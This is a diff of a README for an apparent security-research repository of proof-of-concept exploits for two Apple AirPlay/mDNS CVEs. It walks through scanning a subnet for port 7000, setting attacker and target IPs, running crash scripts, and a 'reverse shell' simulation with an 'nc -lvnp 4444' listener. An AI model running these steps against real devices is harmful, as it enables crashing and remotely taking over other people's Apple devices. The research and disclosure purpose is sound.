@@ -1,120 +1,146 @@
-#AIRBORNE 2-PoCs-1-repository
-poc for CVE-2025-24252 &amp; CVE-2025-24132
+# AIRBORNE – 2-PoCs-1-Repository
 
-both bugs live in Apple’s parsing of network data (especially Bonjour/mDNS and AirPlay’s TCP pairing flow)
+PoCs for **CVE-2025-24252** and **CVE-2025-24132**  
 
-**start with CVE-2025-24252, the mDNS TXT record one**
+Discovered and detailed by Oligo Security
 
-over mDNS (Bonjour). Triggerable via malformed TXT records.
+https://www.oligo.security/blog/airborne
 
--Install scapy and avahi on Kali
+Both bugs live in Apple’s parsing of network data—specifically in Bonjour/mDNS and AirPlay’s TCP pairing flow.
 
+---
+
+## CVE-2025-24252 – mDNS TXT Record Crash Trigger
+
+This vulnerability affects `AirPlayReceiver` and is triggered via malformed mDNS TXT records.
+
+### Setup on Kali Linux
+
+```bash
 sudo apt update
-
 sudo apt install python3-scapy avahi-daemon -y
-
--Start avahi (mDNS responder)
-
 sudo systemctl start avahi-daemon
+```
 
-git clone https://github.com/ekomsSavior/2-PoCs-1-repository.git
+### Clone the Repo
 
--Set your attacker IP and interface on crashtest_CVE-2025-24252.py
+```bash
+git clone https://github.com/ekomsSavior/AirBorne-PoC.git
+cd AirBorne-PoC
+```
 
-nano crashtest_CVE-2025-24252.py (edit ip & interface)
+### Configure the PoC
 
-ctrl + x, then y and finally enter to exit.
+```bash
+nano crashtest_CVE-2025-24252.py
+```
 
--run PoC Script 
+Set your attacker IP and interface. Then save and exit (`CTRL+X`, then `Y`, then `ENTER`).
 
+### Run the PoC
+
+```bash
 python3 crashtest_CVE-2025-24252.py
+```
 
-Use tcpdump to capture traffic on the Apple device’s IP
+### Monitor Target Behavior
 
---Only test this on your own Apple devices in a safe lab setting.
+Use `tcpdump` or Wireshark to capture traffic on the Apple device’s IP.
 
-**CVE-2025-24132 – AirPlay Pairing Exploit PoC**
+> Only test this on your own Apple devices in a safe lab setting.
 
-This bug is in the AirPlayScreen component and can trigger a heap overflow by sending malformed handshake/init packets over TCP to port 7000 on the target device.**
+---
 
--Scan for AirPlay Hosts
+## CVE-2025-24132 – AirPlay Pairing Heap Overflow
 
-On your attacker Kali box
+This bug is in the `AirPlayScreen` component and can trigger a heap overflow by sending malformed pairing/init packets over TCP port 7000.
 
+---
+
+### Scan for Vulnerable AirPlay Hosts
+
+```bash
 nmap -p 7000 --open --script=banner <your-local-subnet>/24
+```
 
-TCP Malformed Packet PoC CVE-2025-24132 
+---
 
-low-level socket-based fuzzing PoC that can be expanded into an RCE trigger with proper payload crafting
+### Crash PoC: TCP Malformed Packet
 
-edit script for target ip
+A low-level socket-based fuzzing PoC that can be expanded into an RCE trigger.
 
+Edit the script
+
+```bash
 nano PoC_CVE-2025-24132.py
+```
 
-edit ip, ctrl +x, then y then enter to exit nano.
+Set your target IP. Then run
 
-run PoC
-
+```bash
 python3 PoC_CVE-2025-24132.py
+```
 
-Confirm the Exploitability
+Watch for
+- System reboots
+- Pairing process freezes
+- AirPlay UI or app crashes
 
-Check your Apple device for
+If observed, a heap overflow condition is likely confirmed.
 
-  System reboots
+---
 
-  Pairing process freezes
+## From Crash to Code Execution – CVE-2025-24132 RCE Simulation
 
-  AirPlay app or UI crashes
+### Overview
 
-If confirmed, we now have a heap overflow condition. 
+Trigger CVE-2025-24132 to simulate executing a reverse shell or `launchctl` job on a vulnerable or jailbroken Apple device.
 
-**From Crash to Code Execution**
+Steps
+- Overflow heap cleanly
+- Inject shell command or plist-based job
+- Trigger reverse shell or persistent execution
 
-Trigger CVE-2025-24132 (heap overflow via AirPlay TCP pairing) to deliver a reverse shell or execute launchctl on a vulnerable Apple device.
+### What We Know
 
-Overflow the heap cleanly
+- AirPlay runs on TCP port `7000`
+- `pairing-init` POST requests are vulnerable when oversized
+- The protocol may accept binary plist payloads or plain XML
 
-Inject shellcode or a ROP chain
+---
 
-Execute remote code like a reverse shell.
+### Run the RCE Simulation Script
 
--What We Know
+```bash
+nano CVE-2025-24132_RCE.py
+```
 
-AirPlay runs a service on port 7000/tcp
+Set your
+- `target_ip` (your Apple device)
+- `attacker_ip` (your Kali machine)
 
-The pairing-init POST request is vulnerable when oversized
+Start your listener
 
-Apple TV and iOS handle pairing using a binary plist-like format, or sometimes a JSON hybrid.
+```bash
+nc -lvnp 4444
+```
 
-The vulnerable component parses a POST with Content-Type: application/octet-stream.
+Then launch the PoC
 
-edit CVE-2025-24132_RCE.py
-
-nano CVE-2025-24132_RCE.py (edit target and attacker ip)
-
-Before You Run:
-
-  Start listener: nc -lvnp 4444
-
-  Use isolated Wi-Fi
-
-  Only run on your own devices or in a legal lab
-
-  Jailbroken Apple TV or vulnerable device = required for execution
-
-launch CVE-2025-24132 RCE Simulation Script
-
+```bash
 python3 CVE-2025-24132_RCE.py
+```
 
-DISCLAIMER-
+This sends a forged `launchctl` payload with a reverse shell string. Works only if the device is jailbroken or unpatched.
 
-USER ASSUMES RESPONSIBILITY WHEN UTILIZING THIS TOOL. ONLY TEST ON NETWORKS YOU HAVE EXPLICIT PERMISSION TO TEST ON.
+---
 
+## DISCLAIMER
 
+This project is for **educational and research purposes only**.
 
+USER ASSUMES FULL RESPONSIBILITY WHEN UTILIZING THIS TOOL.  
+**Only test on networks and devices you own or have explicit permission to test on.**
 
-
-
-
-
+Unauthorized use may violate laws or terms of service.  
+Use responsibly and ethically.
